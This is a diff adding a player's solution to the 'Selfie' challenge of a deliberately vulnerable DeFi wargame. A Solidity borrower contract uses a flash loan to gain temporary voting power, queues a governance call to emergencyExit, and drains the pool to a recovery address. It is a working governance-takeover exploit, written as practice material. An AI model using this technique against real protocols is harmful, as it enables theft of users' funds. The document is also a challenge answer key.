@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -61,8 +62,24 @@ contract SelfieChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_selfie() public checkSolvedByPlayer {
-        
+
+    // 1. request a flashloan to get max voting power
+    // 2. the data I pass to flashloan, has a will be passed to onFlashLoan
+    // 3. this data has a call to emergencyExit of the pool, also the last 20 bytes will be the pool address
+    // 4. So I can queue this action cause I have all tokens
+    // 5. Approve loaner to take back funds, no fail cause I dont use them and theres no fees
+    // 6. Execute in 2 days
+    function test_selfie() public 
+    checkSolvedByPlayer 
+    {
+        // deploy borrower contract
+        Borrower borrower = new Borrower(address(governance), address(pool), recovery);
+
+        // request a flashloan (the callback 'onFlashLoan' has the logic the queue our malicious action) 
+        pool.flashLoan(borrower, address(token), pool.maxFlashLoan(address(token)), '');
+        // after delay period ends, execute the action
+        vm.warp(2 days + 1);
+        governance.executeAction(1);
     }
 
     /**
@@ -72,5 +89,36 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+
+contract Borrower is IERC3156FlashBorrower {
+    SimpleGovernance gov;
+    address pool;
+    address recovery;
+
+    constructor(address _gov, address _pool, address _recovery){
+        gov = SimpleGovernance(_gov);
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function onFlashLoan(
+        address /*initiator*/,
+        address token,
+        uint256 amount,
+        uint256 /*fee*/,
+        bytes calldata /*data*/
+    ) external returns (bytes32) {
+        // delegate the borrowed tokens to 'this' (so `token.getVotes` returns such amount) 
+        DamnValuableVotes(token).delegate(address(this));
+        // prepare malicious call data
+        bytes memory data = abi.encodeWithSignature('emergencyExit(address)', recovery);
+        // queue the action
+        gov.queueAction(pool,0,data);
+        // approve and return to avoid tx to fail 
+        DamnValuableVotes(token).approve(msg.sender, amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
